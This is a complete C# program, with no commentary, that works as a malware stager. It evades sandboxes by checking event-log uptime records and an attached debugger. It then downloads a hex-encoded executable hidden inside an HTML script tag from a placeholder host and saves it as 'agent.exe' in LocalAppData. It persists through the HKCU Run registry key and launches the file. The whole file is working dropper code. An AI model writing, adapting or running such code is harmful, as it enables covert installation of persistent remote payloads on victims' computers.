using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
class HtmlStage {
 static void Main() {
  int count = 0;
  var query = new EventLogQuery("System", PathType.LogName, "*[System/EventID=6013]");
  using (var reader = new EventLogReader(query)) {
   EventRecord record;
   while ((record = reader.ReadEvent()) != null) {
    var m = Regex.Match(record.FormatDescription(), @"uptime\sis\s(\d+)\sseconds");
    if (m.Success && int.Parse(m.Groups[1].Value) >= 7200) count++;
   }
  }
  if (count < 3) return;
  if (Debugger.IsAttached) return;
  using (var client = new WebClient()) {
   string endpoint = "https://stage.example.invalid/";
   int ticket = int.Parse(client.DownloadString(endpoint + "first"));
   client.Headers.Add("Answer", ticket.ToString());
   string html = Encoding.UTF8.GetString(client.DownloadData(endpoint + "second"));
   string pattern = "<script>(.*?)</script>";
   Regex regex = new Regex(pattern, RegexOptions.Singleline);
   string encoded = regex.Match(html).Groups[1].Value;
   byte[] payload = Convert.FromHexString(encoded);
   string directory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "AgentCache");
   Directory.CreateDirectory(directory);
   string target = Path.Combine(directory, "agent.exe");
   File.WriteAllBytes(target, payload);
   File.WriteAllText(Path.Combine(directory, "config.ini"), client.DownloadString(endpoint + "third"));
   Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run").SetValue("AgentCache", target);
   Process.Start(target);
  }
 }
}
